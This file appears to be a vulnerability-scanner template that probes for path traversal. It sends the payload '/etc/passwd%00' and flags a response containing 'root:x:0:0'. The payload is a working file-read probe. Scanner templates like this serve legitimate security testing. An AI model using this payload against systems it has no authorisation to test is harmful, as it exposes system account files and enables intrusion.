id: lfi-029
name: 'Path traversal via template'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads /etc/passwd via template'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      template:
        - '/etc/passwd%00'
    matchers:
      - type: word
        part: body
        words:
          - 'root:x:0:0'
